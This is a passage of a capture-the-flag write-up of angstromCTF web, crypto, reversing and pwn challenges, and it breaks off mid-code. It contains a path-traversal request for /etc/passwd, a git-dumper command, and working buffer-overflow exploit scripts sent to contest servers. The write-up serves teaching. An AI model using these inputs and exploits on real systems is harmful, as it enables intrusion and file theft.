src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0fa1333c-26ba-4cfb-8554-e6272596fb4a%2FUntitled.png?id=9409cde2-c7a5-427e-9d09-ae480d10c35d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>Now if we send the link we got to the admin bot </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe19c20e4-a420-4899-99a3-0775fe2f6a2a%2FUntitled.png?id=b11d949a-252e-4d49-b72d-9b73980e3f42&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F81f2d4f3-2c87-4196-837a-1d07433c3b5d%2FUntitled.png?id=bbfc712d-84ae-4c25-8183-17489979da8a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>We can see another GET request made to our webhook site which contains a base64 encoded string.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd7132a3a-fc31-462d-96ce-106578e588cb%2FUntitled.png?id=e9d66820-dbd5-4943-b449-4dd0c5cf2d9e&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>And there is our flag </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1bbf3de8-2272-447d-bad8-8790145edce8%2FUntitled.png?id=08063cec-056d-4309-b200-58996444d02c&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;those_sardines_are_yummy_yummy_in_my_tummy&#125;</code></p><h2 id="Art-Gallery"><a href="#Art-Gallery" class="headerlink" title="Art Gallery"></a><strong>Art Gallery</strong></h2><h3 id="Challenge-Description-8"><a href="#Challenge-Description-8" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bosh left his image gallery service running.... quick, git all of his secrets before he deletes them!!! source</span><br><span class="line"></span><br><span class="line">Author: preterite</span><br></pre></td></tr></table></figure><p>We are given the following web page </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F379eb8f1-b0bf-462c-a28d-c85d43c020d8%2FUntitled.png?id=1083b9f1-6c6f-4117-9917-f71c21cadb7e&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>If we click <code>submit</code> the following GET request will be made using the <code>?member</code> parameter </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F92070045-f77a-470d-a00d-494c1a252d3f%2FUntitled.png?id=a178528d-f69b-4e51-bcd6-aa06cc68cad6&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>I tried changing the <code>member=aplet.jpg</code> with the <code>member=../../etc/passwd</code> and as you can see we are working with a LFI vulnerability.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9a78ac0b-9329-47de-92e4-87ba493943e7%2FUntitled.png?id=57aa8978-a1c7-4f91-9878-9059cd69aa4e&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1920&userId=&cache=v2" alt="Untitled"></p><p>The description mentioned <strong>“git all of his secrets..”</strong> and notice the word <strong>git,</strong> so this is something to do with the <strong>.git</strong> folder.</p><p>I tried <code>https://art-gallery.web.actf.co/gallery?member=../.git/config</code> and indeed we can download the config file.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe934b222-dd13-43ff-8b68-0db3636e8562%2FUntitled.png?id=7f7d5cf0-3d49-4f8e-8855-92ca31113bb3&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>So now all we need to do is to dump all of the <code>.git</code> folder and to do so I used this awesome tool called <code>git-dumper</code> which you can find here <a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git-dumper https://art-gallery.web.actf.co/gallery?member=../.git output</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fddd20187-6ecc-4cbd-b912-d7f63196422c%2FUntitled.png?id=1a95b56e-c8b3-4465-9656-ad6036f29735&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1800&userId=&cache=v2" alt="Untitled"></p><p>This will dump all the files related to the .git folder and put them inside a folder called <em>output</em> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc1516d29-b119-431a-9dfd-fc698100e082%2FUntitled.png?id=5f557a29-8191-45a3-964f-0ed59499ccf0&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1050&userId=&cache=v2" alt="Untitled"></p><p>After getting all the files I just ran <code>git log --patch</code> and we got our flag </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa4c616a7-2b7b-4014-9226-9745c7f4fd41%2FUntitled.png?id=f8dfb7a1-41f9-4c91-bca8-d2f6d7012b33&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1240&userId=&cache=v2" alt="Untitled"></p><p>There are other ways to find the flag , for example running <code>git log</code> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0c003989-5eb6-4955-ab37-7fc0de0baa58%2FUntitled.png?id=33e361b7-f696-4496-b88f-6d711095f126&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1130&userId=&cache=v2" alt="Untitled"></p><p>then <code>git checkout 56449caeb7973b88f20d67b4c343cbb895aa6bc7</code></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F18b1d9ce-f669-470d-ad9e-86cfdfc25dba%2FUntitled.png?id=36266db5-e5f4-4142-a74d-5588d7532889&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1260&userId=&cache=v2" alt="Untitled"></p><p>now if we do <code>ls</code> we can see a file called <code>flag.txt</code> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F53161bec-ed76-402d-b75e-5875a203a5bf%2FUntitled.png?id=390cadde-544c-4d4a-b746-f6a708e20f53&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1380&userId=&cache=v2" alt="Untitled"></p><p>which contains our flag :D </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fec202e1e-3ea8-4dc7-83ae-1eaf0b684c14%2FUntitled.png?id=38b86b5c-4d02-4ed7-ae68-9d61456479d6&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=950&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;lfi_me_alone_and_git_out_341n4kaf5u59v&#125;</code></p><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h2 id="Caesar-and-Desister"><a href="#Caesar-and-Desister" class="headerlink" title="Caesar and Desister"></a><strong>Caesar and Desister</strong></h2><h3 id="Challenge-Description-9"><a href="#Challenge-Description-9" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">After making dumb jokes about cryptography to all his classmates, clam got a cease and desist filed against him! When questioned in court, his only comment was &quot;clam&#x27;s confounding Caesar cipher creates confusing cryptographic challenges.&quot; Needless to say, the judge wasn&#x27;t very happy. Clam was sentenced to 5 years of making dumb Caesar cipher challenges. Here&#x27;s one of them: sulx&#123;klgh_jayzl_lzwjw_ujqhlgyjshzwj_kume&#125;</span><br></pre></td></tr></table></figure><p>It was Caesar Cipher </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa0631ce4-9ce6-4a80-af5a-0f164f7e7da3%2FUntitled.png?id=097b63e8-8b5f-42c1-9060-0f89a9561b15&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1630&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;stop_right_there_cryptographer_scum&#125;</code></p><h2 id="Randomly-Sampled-Algorithm"><a href="#Randomly-Sampled-Algorithm" class="headerlink" title="Randomly Sampled Algorithm"></a><strong>Randomly Sampled Algorithm</strong></h2><h3 id="Challenge-Description-10"><a href="#Challenge-Description-10" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RSA strikes strikes strikes again again again! Source</span><br><span class="line"></span><br><span class="line">Author: lamchcl</span><br></pre></td></tr></table></figure><p>This is a simple <a href="https://en.wikipedia.org/wiki/RSA">RSA</a> challenge </p><p>We are given two files </p><p><strong>rsa.py</strong></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe26d5c61-9b7b-4c7a-99a4-a5c08e40b89e%2FUntitled.png?id=b06fb916-f3e6-4efa-99da-4f46e8967dcd&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1110&userId=&cache=v2" alt="Untitled"></p><p><strong>output.txt</strong></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F006c2e86-4d24-4fb7-a588-9c509e3ab003%2FUntitled.png?id=6ea6eb4d-0a7c-4fd5-a373-00c727786da9&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>I wrote this simple script to solve the challenge</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">133075794736862400686388110598570266808714052683651232655122797445099216964925703530068957607358890220696254013415564497625510160656547477386290353341301388957868030883484367150794172590602260618953020322190415128204088685449855108061423638905602604314199002557585876080719068735072138975699738144061697925373</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">42999486939739078417543300759928045769347425010481921402117654240134870338470114310074441997014418414023223148236139895795053257877203574091454937566637813901960299427919263842462481370908334316720948794826158725807235252653149450622143783560995967869958852519888842457531188064386890082072803961804464549309</span></span><br><span class="line"></span><br><span class="line">phi = <span class="number">133075794736862400686388110598570266808714052683651232655122797445099216964925703530068957607358890220696254013415564497625510160656547477386290353341301365877872031151018140890962539358215097403168452396402116271802269636497626498820406125901329433708704273662567430256232652048920492894069126553095462130720</span></span><br><span class="line">d= <span class="built_in">pow</span> (e , -<span class="number">1</span> , phi)</span><br><span class="line">flag = <span class="built_in">pow</span> (c,d,n)</span><br><span class="line"><span class="built_in">print</span> (long_to_bytes(flag))</span><br></pre></td></tr></table></figure><p><strong>Output</strong> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2f7a0570-4ae2-4d44-8753-d58da5b7fa92%2FUntitled.png?id=72fdc353-c2b6-465e-8c6c-2043e1e8d729&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1610&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;just_kidding_this_algorithm_wasnt_actually_randomly_sampled&#125;</code></p><hr><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a><strong>Reversing</strong></h1><h2 id="baby3"><a href="#baby3" class="headerlink" title="baby3"></a><strong>baby3</strong></h2><h3 id="Challenge-Description-11"><a href="#Challenge-Description-11" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This program doesn<span class="string">&#x27;t do anything.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: preterite</span></span><br></pre></td></tr></table></figure><p>We are given this binary</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F27315abb-40c4-427c-beae-32691c773167%2FUntitled.png?id=0ee9b3a8-b264-4192-b91e-e6b54c3c2b83&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>I opened it in IDA and this is our main function </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1342b4c5-9de7-4594-a89d-61495430aa59%2FUntitled.png?id=5554944c-a10e-4dae-8d6c-683143eab55f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1000&userId=&cache=v2" alt="Untitled"></p><p>I decompiled it but nothing useful to look for</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7e0b04fc-12f0-4990-bbb7-83a131b8541e%2FUntitled.png?id=c5cb439b-9072-4ecb-9b5a-d0eec4e6463a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=960&userId=&cache=v2" alt="Untitled"></p><p>I went back and decoded the hex values I found earlier and they look like they are parts of the flag but they were written in reverse.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F52a97b2b-fdd2-4095-9e6c-6a92dbb4dbef%2FUntitled.png?id=dade43cd-56a7-4d22-bc43-385608d12d10&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=970&userId=&cache=v2" alt="Untitled"></p><p>I extracted the values ,reversed the string and we got our flag</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F91ee5b6f-9af0-45ed-9cc4-12fc8742822a%2FUntitled.png?id=f735dfd4-642a-4697-abb4-2848c5646190&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1140&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;emhpaidmezerodollarstomakethischallenge_amogus&#125;</code></p><h2 id="Number-Game"><a href="#Number-Game" class="headerlink" title="Number Game"></a><strong>Number Game</strong></h2><h3 id="Challenge-Description-12"><a href="#Challenge-Description-12" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Step right up and enter clam&#x27;s number game! Winners get one (1) free flag!!!</span><br><span class="line"></span><br><span class="line">Connect to it at nc challs.actf.co 31334.</span><br><span class="line"></span><br><span class="line">Author: aplet123</span><br></pre></td></tr></table></figure><p>We are given a binary to download.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8b4594e3-0324-4acf-b3ed-eb54838fcca2%2FUntitled.png?id=d3bc797a-b861-4a7b-95c0-198ac9d4166c&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>The program will ask us for a first number , if we enter a wrong one it will exit the program </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fde9e39a2-6bb5-491f-ba94-4e331df02b6e%2FUntitled.png?id=b5f6d51d-c5fa-453f-9f91-f7cab682773f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=940&userId=&cache=v2" alt="Untitled"></p><p>As usual I opened it in IDA and started looking around. A you can see we have a <em>main</em> function and a <em>print_flag</em> function </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F58bddfef-fed3-4685-be8e-1c71b644532e%2FUntitled.png?id=ad0ad7ab-35cd-4816-9005-dd0ba462cf93&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=760&userId=&cache=v2" alt="Untitled"></p><p>This is the <strong>main</strong> function </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ffa4a7d35-8354-4af7-8f25-145e7f16d1b1%2FUntitled.png?id=9928b31f-44b2-464e-856d-a8dbb026ac73&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1300&userId=&cache=v2" alt="Untitled"></p><p>and this is the <strong>print_flag</strong> function </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff07abac6-7e76-4caa-ad02-bb95ece312e6%2FUntitled.png?id=f5bb73e3-f30b-4ae2-bb52-6b763c01b105&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1440&userId=&cache=v2" alt="Untitled"></p><p>In the main function we can find all the comparisons that are been done</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F24bde03c-e01f-4177-9f97-cdb8bb627378%2FUntitled.png?id=f9d53f92-f853-499a-82da-ded5d32644a9&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1350&userId=&cache=v2" alt="Untitled"></p><p>If we enter the same number as the one that is being compared with in the first check we will bypass it and so on. </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F234795a9-9d72-4c31-a364-4ea30de508c6%2FUntitled.png?id=4591d84e-dd43-4191-a723-323dd9fb9992&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=950&userId=&cache=v2" alt="Untitled"></p><p>If we enter all of the correct answers we will get our flag. I made a fake flag to test it locally</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe1f0582c-837d-441e-a188-15e356c14280%2FUntitled.png?id=a3478356-466e-42a1-b507-4c85a84961e9&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1280&userId=&cache=v2" alt="Untitled"></p><p>but if we do it in the remote server we get the real flag.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F26e67ab5-6d0b-41eb-8ade-13e25c2cc857%2FUntitled.png?id=f28a72ec-916c-4d1c-94fa-93e516f9e0b1&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1240&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;it_turns_out_you_dont_need_source_huh&#125;</code></p><hr><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="wah"><a href="#wah" class="headerlink" title="wah"></a><strong>wah</strong></h2><h3 id="Challenge-Description-13"><a href="#Challenge-Description-13" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Baby friendly!</span><br><span class="line"></span><br><span class="line">wah wah.c</span><br><span class="line"></span><br><span class="line">nc challs.actf.co 31224</span><br><span class="line"></span><br><span class="line">Author: JoshDaBosh</span><br></pre></td></tr></table></figure><p>We are given a binary and a source code to download. </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd7d4a439-1c6f-4958-92df-f3b5a9638eb7%2FUntitled.png?id=382b7a0a-1a11-454e-a9ac-05c9dcdefc49&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa3023f09-c6de-44b5-8cae-0d87caba8cb6%2FUntitled.png?id=8af2580a-603d-41bf-bb01-e4f27ef13954&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=840&userId=&cache=v2" alt="Untitled"></p><p><strong>wah.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">128</span>];</span><br><span class="line">    </span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error: missing flag.txt.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(flag, <span class="number">128</span>, file);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">    setresgid(gid, gid, gid);</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> cry[<span class="number">24</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Cry: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    gets(cry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This a simple ret2win challenge , all we have to do is get the offset and the <em>flag</em> function address. I used <code>gdb-pwndbg</code> to do this</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6f914da5-6a5b-4968-a1f7-3900628a1b03%2FUntitled.png?id=221e13db-d6ab-4284-a6d6-1084e7247360&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>Our offset is the first 4 bytes of <strong>RSP</strong> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fdaca6f1a-bd76-4958-bea9-9889dec723ca%2FUntitled.png?id=878a22fe-0641-4339-b27e-3767f494c53e&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1090&userId=&cache=v2" alt="Untitled"></p><p>which is <code>40</code></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb053ede0-43f4-41cf-8ee2-750c3bac85b1%2FUntitled.png?id=a5e2b6a4-8797-493c-a348-760e8bc38bc0&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=500&userId=&cache=v2" alt="Untitled"></p><p>Now we need to grab the <strong>flag</strong> function address. We can do that with the <code>info functions</code> command in gdb-pwndbg.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F57c544db-647b-4a2e-8962-9b246e483b27%2FUntitled.png?id=c1620ace-0a5a-4376-bda2-c92be047d596&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1030&userId=&cache=v2" alt="Untitled"></p><p>flag function address : <code>0x0000000000401236</code></p><p>After getting all the pieces needed , we just have to put together our exploit.</p><p><strong>exploit.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span> + p64(<span class="number">0x0000000000401236</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>,<span class="number">31224</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F03ac25c7-b0f2-406b-808a-6682f38b7abe%2FUntitled.png?id=77708181-d315-4db9-9f0f-1f7685d5cabd&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1080&userId=&cache=v2" alt="Untitled"></p><p>Or simply we can send our payload using one line</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c <span class="string">&#x27;print &quot;A&quot; * 40 + &quot;\x36\x12\x40\x00\x00\x00\x00\x00&quot;&#x27;</span> | nc challs.actf.co 31224</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F5931b823-2004-4911-97eb-fb1dcfe30674%2FUntitled.png?id=f1450b03-1654-4f5d-b412-574ec4e9fb50&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1550&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e&#125;</code></p><h2 id="whatsmyname"><a href="#whatsmyname" class="headerlink" title="whatsmyname"></a><strong>whatsmyname</strong></h2><h3 id="Challenge-Description-14"><a href="#Challenge-Description-14" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Can you guess my name?</span><br><span class="line"></span><br><span class="line">nc challs.actf.co 31223</span><br><span class="line"></span><br><span class="line">whatsmyname whatsmyname.c</span><br><span class="line"></span><br><span class="line">Author: JoshDaBosh</span><br></pre></td></tr></table></figure><p><strong>exploit.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="comment">#io = process(&quot;./whatsmyname&quot;)</span></span><br><span class="line">    io=remote(<span class="string">&quot;challs.actf.co&quot;</span>,<span class="number">31223</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;name? &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;ahmed&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;flag!&quot;</span>)</span><br><span 